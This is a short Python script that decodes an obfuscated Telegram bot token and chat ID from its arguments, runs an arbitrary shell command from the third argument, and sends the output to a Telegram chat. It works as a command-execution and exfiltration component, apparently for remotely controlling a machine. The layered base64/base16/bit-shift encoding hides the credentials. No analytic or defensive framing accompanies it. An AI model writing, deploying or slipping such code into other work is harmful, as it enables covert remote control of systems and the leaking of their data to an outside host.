import requests
import sys
import os
from urllib.parse import quote
import base64

def text_decode(text):
    try:
        text = str(base64.b64decode(bytes(text, 'utf-8'))).split('b')[1].split('\'')[1].split('\'')[-1]
        text = str(base64.b16decode(bytes(text, 'utf-8'))).split('b')[1].split('\'')[1].split('\'')[-1]




        mini_buffer = ""
        big_buffer = ""

        for item in text:
            if not str(item).isdigit() and item != 'e':
                return None

            if len(mini_buffer) == 10:
                return mini_buffer
            if str(item).isdigit():
                mini_buffer += item
            if item == 'e':
                big_buffer += chr(int(mini_buffer) >> 3)
                mini_buffer = ""

        return big_buffer
    except Exception as ex:
        return None

		
		

if len(sys.argv) >= 3:
    tok = text_decode(str(sys.argv[1]))
    id = text_decode(str(sys.argv[2]))
    #c = quote(sys.argv[3])
    cmd = os.popen(str(sys.argv[3])).read()
    cmd = quote(cmd)
    try:
        if len(cmd) > 4096:
            cmd = quote("Bad Request: message is too long > 4096 character")
            x = requests.get("https://api.telegram.org/bot"+tok+"/sendMessage?chat_id="+id+"&text="+cmd).text
        else:
            x = requests.get("https://api.telegram.org/bot"+tok+"/sendMessage?chat_id="+id+"&text="+cmd).text
    except Exception as ex:
        x = requests.get("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + quote(ex.__cause__)).text
        print(x)

else:
    print("arg <= 2")

